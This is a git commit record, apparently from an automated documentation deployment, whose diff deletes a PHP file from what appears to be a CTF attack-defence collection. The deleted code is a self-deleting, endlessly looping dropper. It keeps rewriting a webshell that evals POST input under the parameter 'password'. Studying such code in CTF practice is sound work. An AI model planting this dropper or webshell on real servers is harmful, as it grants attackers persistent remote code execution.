3b5d5c8b7e91c508439b74b3da4343f98d4313ee
Travis Builder <wzcboss@qq.com>
2019-09-09 06:17:42 +0000

    Deployed f9f5d663 with MkDocs version: 1.0.4

--- ctf/awd/muma/m3.php
+++
@@ -1,9 +0,0 @@
-<?php
-    set_time_limit(0);
-    ignore_user_abort(1);
-    unlink(__FILE__);
-    //file_put_contents(__FILE__,'');
-    while(1){
-        file_put_contents('path/webshell.php','<?php @eval($_POST["password"]);?>');
-    }
-?>
